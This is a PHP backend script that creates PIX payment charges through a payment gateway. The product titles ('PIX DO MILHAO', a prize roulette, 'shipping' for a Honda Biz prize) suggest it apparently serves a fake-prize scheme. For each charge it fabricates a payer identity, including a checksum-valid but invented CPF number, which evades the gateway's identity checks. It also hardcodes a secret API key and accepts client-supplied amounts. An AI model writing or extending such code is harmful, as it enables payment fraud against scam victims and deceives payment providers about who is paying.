<?php
ini_set('display_errors', 1);
ini_set('log_errors', 1);
error_reporting(E_ALL);

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

require_once 'database.php';

// === CONFIGURAÇÃO PRINCIPAL ===
$secretKey = '8b220b0b-0d49-4977-8aee-53585f8c6df9';
$apiUrl = 'https://pay.nivopayoficial.com.br/api/v1/transaction.purchase';

// === RECEBER DADOS DO POST (das APIs Next.js) ===
$input = json_decode(file_get_contents('php://input'), true);

// === VALOR ===
$valor_centavos = 5490; // valor padrão

// Verifica se veio via GET (gerar.php?value=28.30)
if (isset($_GET['value'])) {
    $valor_decimal = floatval($_GET['value']);
    $valor_centavos = intval($valor_decimal * 100);
}
// Verifica se veio via POST JSON (das APIs Next.js)
elseif (isset($input['amount'])) {
    $valor_centavos = intval($input['amount']);
}
// Verifica se veio via POST form
elseif (isset($_POST['valorTotal'])) {
    $valor_centavos = intval($_POST['valorTotal']);
}

// === DADOS FIXOS (PADRÃO FUNCIONANDO) ===
function gerarCPF() {
    $cpf = '';
    for ($i = 0; $i < 9; $i++) $cpf .= rand(0, 9);
    for ($i = 9; $i < 11; $i++) {
        $soma = 0;
        for ($j = 0; $j < $i; $j++) $soma += $cpf[$j] * (($i + 1) - $j);
        $digito = $soma % 11;
        $cpf .= ($digito < 2) ? 0 : 11 - $digito;
    }
    return $cpf;
}

$nomes = ['João', 'Maria', 'Lucas', 'Julia', 'Pedro', 'Larissa', 'Felipe'];
$sobrenomes = ['Silva', 'Souza', 'Oliveira', 'Pereira', 'Costa'];
$nome_cliente = $nomes[array_rand($nomes)] . ' ' . $sobrenomes[array_rand($sobrenomes)];
$email = strtolower(str_replace(' ', '.', $nome_cliente)) . '@email.com';
$cpf = gerarCPF();
$phone = "11999999999"; // sem +55, como exigido pela Nivopay

// === UTM e TÍTULO DO PRODUTO ===
$utmQuery = $_SERVER['QUERY_STRING'] ?? '';

// Título baseado no contexto enviado
$produtoTitulo = 'PIX DO MILHAO';
if (isset($input['prize_name'])) {
    $produtoTitulo = 'Roleta da Sorte - Prêmio: ' . $input['prize_name'];
} elseif (isset($input['shipping_option'])) {
    $produtoTitulo = 'Frete Honda Biz 2025 - ' . $input['shipping_option'];
}

// === MONTAR PAYLOAD ===
$data = [
    "paymentMethod" => "PIX",
    "amount" => $valor_centavos,
    "items" => [
        [
            "unitPrice" => $valor_centavos,
            "title" => $produtoTitulo,
            "quantity" => 1,
            "tangible" => false
        ]
    ],
    "utmQuery" => $utmQuery,
    "checkoutUrl" => "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'],
    "referrerUrl" => $_SERVER['HTTP_REFERER'] ?? '',
    "externalId" => uniqid('pixmilhao_'),
    "traceable" => true,
    "name" => $nome_cliente,
    "email" => $email,
    "cpf" => $cpf,
    "phone" => $phone
];

// === ENVIAR PARA API ===
$ch = curl_init($apiUrl);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($data),
    CURLOPT_HTTPHEADER => [
        'Authorization: ' . $secretKey,
        'Content-Type: application/json'
    ]
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// === LOG PARA DEBUG ===
$logFile = __DIR__ . '/gerar.log';
$logData = [
    'timestamp' => date('Y-m-d H:i:s'),
    'input_received' => $input,
    'valor_centavos' => $valor_centavos,
    'dados_gerados' => [
        'nome_cliente' => $nome_cliente,
        'email' => $email,
        'cpf' => $cpf,
        'phone' => $phone
    ],
    'payload_sent' => $data,
    'http_code' => $httpCode,
    'api_response' => substr($response, 0, 500) // Limitar tamanho do log
];
file_put_contents($logFile, json_encode($logData, JSON_PRETTY_PRINT) . "\n" . str_repeat("=", 80) . "\n\n", FILE_APPEND);

// === PROCESSAR RESPOSTA ===
if ($httpCode !== 200 || !$response) {
    echo json_encode([
        'error' => true,
        'message' => 'Erro ao gerar o PIX (HTTP: ' . $httpCode . ')',
        'resposta' => $response
    ]);
    exit;
}

$res = json_decode($response, true);
if (json_last_error() !== JSON_ERROR_NONE) {
    echo json_encode([
        'error' => true,
        'message' => 'Resposta inválida da API',
        'json_error' => json_last_error_msg(),
        'raw_response' => $response
    ]);
    exit;
}

if (!isset($res['pixCode'])) {
    echo json_encode([
        'error' => true,
        'message' => 'PIX não gerado pela API',
        'api_response' => $res,
        'expected_field' => 'pixCode'
    ]);
    exit;
}

// === SALVAR NO BANCO INTERNO ===
$db = new SimpleDB();
$db->insert([
    'payment_id' => $res['id'],
    'status' => 'PENDING',
    'amount' => $valor_centavos,
    'customer_name' => $nome_cliente,
    'customer_email' => $email,
    'customer_cpf' => $cpf,
    'pix_code' => $res['pixCode'],
    'action' => 'GENERATED'
]);

// === RESPOSTA FINAL PARA O FRONTEND ===
echo json_encode([
    'error' => false,
    'QRCode' => $res['pixCode'],
    'identifier' => $res['id'],
    'valor' => $valor_centavos
]);
